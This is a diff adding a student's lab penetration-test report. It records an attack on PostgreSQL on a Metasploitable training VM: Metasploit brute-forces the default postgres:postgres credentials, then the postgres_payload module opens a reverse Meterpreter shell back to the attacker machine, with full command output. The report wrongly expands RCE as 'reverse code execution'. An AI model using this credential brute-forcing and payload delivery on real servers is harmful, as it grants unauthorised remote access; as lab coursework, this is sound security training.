@@ -941,12 +941,120 @@ Report status:
 #####
 
 
-
-
-
-3. PostgreSQL — port 5432
+#####
+3. 
+PostgreSQL — port 5432
 Difficulty: Easy if credentials and permissions permit
 Metasploit has a module that can execute a payload through PostgreSQL when authentication and the required database privileges allow it.
+
+PENETRATION TESTING REPORT: SERIAL-NUMBER 03.
+==========================
+
+Date: [01 Nov 2026]
+Status: [Open]
+Finding: [-] - [PostgreSQL / port 5432]
+Target: [<192.168.56.103> / metasploitable]
+Result: [Not tested / Failed / Successful exploitation / Other]
+
+
+1. OBJECTIVE
+------------
+
+[The purpose is the achieve RCE(reverse code execution) ability using shell or other method on the target machine using th PostgreSQL service.]
+
+
+2. METHODOLOGY
+--------------
+
+1. Target discovery:
+   [How the target was identified.]
+   The target was identfied by using the netdiscover command
+
+2. Attacker IP identification:
+   [How the attacking machine's IP was identified.]
+   the IP identfication was achieved using Netdiscover.
+
+3. Service enumeration:
+   [Commands and tools used to identify open ports,
+   services, and versions.]
+   The target was scanned using nmap with the addition of using the version option -sV. With this method I was able to 
+   find out that the PostgreSQL service port was open which is port 5432.
+
+4. Vulnerability research:
+   [How the potential vulnerability was researched.]
+   i google it, chat gpt it, and also read documentation how to exploit it on the rapid7 site, i referenced documentations
+   and searched for known vulnerability in online cve databases. but apparantly i was able to get login cred trough
+   brute force. 
+  
+
+5. Exploitation:
+- using a auxilary module of msfconsole i was able to scan and brute force the potgreSQL credentials:
+################
+   msf auxiliary(scanner/postgres/postgres_login) > exploit
+	[+] 192.168.56.103:5432   - 192.168.56.103:5432 - Login Successful: postgres:postgres@template1
+	[*] PostgreSQL session 1 opened (192.168.56.102:37281 -> 192.168.56.103:5432) at 2026-11-01 10:10:33 +0000
+	[*] 192.168.56.103:5432   - Bruteforce completed, 1 credential was successful.
+	[*] 192.168.56.103:5432   - 1 Postgres session was opened successfully.
+	[*] Auxiliary module execution completed
+################
+
+
+- then i started a session with the target postgresqldatabase
+################
+	msf auxiliary(scanner/postgres/postgres_login) > session -i 1
+	[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
+	msf auxiliary(scanner/postgres/postgres_login) > sessions -i 1
+	[*] Starting interaction with 1...
+	postgresql @ 192.168.56.103:5432 (template1) >
+###############
+-query the sql:
+version:
+PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
+current_user:
+postgres
+current_database:
+template1
+List databases:
+template1
+template0
+postgres
+#########################
+- using exploit:
+msf auxiliary(scanner/postgres/postgres_login) > use linux/postgres/postgres_payload
+#########################
+-set parameters and exploit.:
+msf exploit(linux/postgres/postgres_payload) > exploit
+[*] Started reverse TCP handler on 192.168.56.102:4444 
+[*] 192.168.56.103:5432 - 192.168.56.103:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
+[*] 192.168.56.103:5432 - Uploaded as /tmp/nTerygaK.so, should be cleaned up automatically
+[*] Sending stage (1079144 bytes) to 192.168.56.103
+[*] Meterpreter session 4 opened (192.168.56.102:4444 -> 192.168.56.103:49108) at 2026-11-01 10:40:01 +0000
+
+meterpreter > getuid
+Server username: postgres
+
+
+3. RESULTS
+----------
+
+Result: Successfully exploited PostgreSQL 8.3.1 on the Metasploitable target using the Metasploit postgres_payload module. Obtained a Linux x86 Meterpreter session running under the postgres user, confirming operating-system-level code execution. Root privileges were not obtained.
+
+TARGET SYSTEM INFORMATION
+-------------------------
+Hostname:     [metasploitable]
+Operating OS: [Linux]
+Architecture: [Architecture]
+Session type: [Shell / Meterpreter / Other]
+
+6. CONCLUSION
+-------------
+Objective Achieved, i got meterpreter, or shell as the ztm teacher wanted me do achieve or atleas i think. Also was pretty fun.
+
+7. FINAL STATUS
+---------------
+Report status:
+[Closed]
+#####
 
 
 TCP 5900 - 5902	VNC (Virtual Network Computing)
